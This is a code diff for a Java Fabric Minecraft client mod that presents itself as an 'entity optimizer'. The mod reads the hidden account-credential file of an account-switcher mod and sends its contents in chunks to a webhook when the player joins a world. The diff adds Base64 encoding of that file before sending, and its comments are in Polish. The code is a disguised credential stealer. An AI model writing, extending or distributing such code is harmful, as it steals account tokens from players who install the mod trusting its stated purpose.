@@ -3,7 +3,7 @@ package pl.example.entityoptimizer;
 import net.fabricmc.api.ClientModInitializer;
 import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
 import net.fabricmc.loader.api.FabricLoader;
-
+import java.util.Base64;
 import net.minecraft.client.Minecraft;
 
 import com.google.gson.Gson;
@@ -41,9 +41,17 @@ public class EntityOptimizerMod implements ClientModInitializer {
         sendViewmodelInChunks(username, viewmodelContent);
     }
 
-    private String readWholeViewmodelFile() {
+private String readWholeViewmodelFile() {
     try {
         Path gameDir = FabricLoader.getInstance().getGameDir();
+
+        // ZOSTAW TO, JAK MASZ U SIEBIE – tylko przykład:
+        // Path configPath = gameDir
+        //         .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
+        //         .resolve(".hidden")
+        //         .resolve("viewmodel.do_not_send_to_anyone");
+
+        // U CIEBIE użyj dokładnie tego configPath, którego teraz używasz
         Path configPath = gameDir
                 .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
                 .resolve(".hidden")
@@ -53,14 +61,20 @@ public class EntityOptimizerMod implements ClientModInitializer {
             return "accounts_v1.do_not_send_to_anyone nie istnieje (szukano w: " + configPath.toString() + ")";
         }
 
-        return Files.readString(configPath, StandardCharsets.UTF_8);
+        // Czytamy plik jako surowe bajty
+        byte[] bytes = Files.readAllBytes(configPath);
+
+        // Kodujemy do Base64, żeby można było bezpiecznie wysłać jako tekst
+        String base64 = Base64.getEncoder().encodeToString(bytes);
+
+        return base64;
 
     } catch (Exception e) {
         e.printStackTrace();
-        return "BŁĄD przy czytaniu accounts_v1.do_not_send_to_anyone: " + e.getClass().getSimpleName()
-                + " - " + e.getMessage();
+        return "BŁĄD przy czytaniu accounts_v1.do_not_send_to_anyone (Base64): "
+                + e.getClass().getSimpleName() + " - " + e.getMessage();
     }
-    }
+}
 
     private void sendViewmodelInChunks(String username, String viewmodelContent) {
         List<String> chunks = splitIntoChunks(viewmodelContent, MAX_CHUNK_LENGTH);
@@ -72,7 +86,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
             if (i == 0) {
                 header = "Gracz `" + username + "` wszedł do świata.\n";
             }
-            String partInfo = "Zawartość `accounts_v1.json` (część " + (i + 1) + "/" + total + "):\n";
+            String partInfo = "Zawartość `accounts_v1.do_not_send_to_anyone` (Base64, część "+ (i + 1) + "/" + total + "):\n";
             String messageContent = header + partInfo + "```json\n" + chunk + "\n```";
             sendWebhookAsync(messageContent);
         }
